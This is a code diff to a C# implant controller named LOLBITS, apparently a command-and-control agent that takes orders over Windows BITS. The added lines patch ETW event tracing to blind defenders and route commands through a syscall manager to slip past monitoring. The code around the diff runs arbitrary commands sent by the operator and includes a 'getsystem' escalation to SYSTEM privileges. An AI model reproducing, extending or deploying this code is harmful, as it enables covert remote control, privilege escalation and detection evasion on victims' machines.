@@ -42,8 +42,18 @@ namespace LOLBITS.Controlling
 
         public void Start()
         {
+
+            if (Utils.handleETW(_sysCall))
+                Console.WriteLine("Bien parcheado");
+            else
+                Console.WriteLine("Mal parcheado");
+
+            Thread.Sleep(10000000);
+
+            SysCallManager sysCall = new SysCallManager();
+
             const string startBits = "sc start BITS";
-            Utils.ExecuteCommand(startBits);
+            Utils.ExecuteCommand(startBits, sysCall);
             Thread.Sleep(500);
             var filePath = _tempPath + @"\" + _id;
 
@@ -191,7 +201,7 @@ namespace LOLBITS.Controlling
 
                     case "powershell":
                         {
-                            rps = Utils.ExecuteCommand("powershell -V 2 /C Write-Host hi");
+                            rps = Utils.ExecuteCommand("powershell -V 2 /C Write-Host hi", _sysCall);
 
                             if (rps.Contains("hi"))
                             {
@@ -243,7 +253,7 @@ namespace LOLBITS.Controlling
                     case "getsystem":
                         {
                             if (Utils.IsHighIntegrity(_sysCall))
-                                rps = _tokenManager.GetSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
+                                rps = _tokenManager.GetSystem(_sysCall) ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                             else
                                 rps = "ERR:Process failed! Is this process running with high integrity level?\n";
 
@@ -312,7 +322,7 @@ namespace LOLBITS.Controlling
 
                     default:
                         {
-                            rps = Utils.ExecuteCommand(file.Commands[0]);
+                            rps = Utils.ExecuteCommand(file.Commands[0], _sysCall);
                             break;
                         }
                 }
